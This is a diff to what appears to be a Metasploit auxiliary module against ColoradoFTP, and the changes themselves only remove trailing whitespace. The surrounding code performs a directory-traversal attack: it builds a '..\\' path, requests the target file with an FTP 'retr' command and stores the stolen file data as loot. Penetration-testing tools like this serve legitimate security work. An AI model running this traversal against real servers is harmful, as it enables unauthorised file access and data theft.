@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
         retr_cmd = '\\\\\\' + ("..\\" * datastore['DEPTH'] ) + "#{file_path}"
         res = send_cmd( ["retr", retr_cmd], true)
         print_status(res)
-        
+
         # dont assume theres still a sock to read from. Per #7582
         if sock.nil?
           return
@@ -86,17 +86,17 @@ class MetasploitModule < Msf::Auxiliary
           # read the file data from the socket that we opened
           response_data = sock.read(1024)
         end
-  
+
         unless response_data
           print_error("#{file} not found")
           return
         end
-  
+
         if response_data.length == 0
           print_status("File (#{file_path})from #{peer} is empty...")
           return
         end
-  
+
         # store file data to loot
         loot_file = store_loot("coloradoftp.ftp.data", "text", rhost, response_data, file, file_path)
         vprint_status("Data returned:\n")
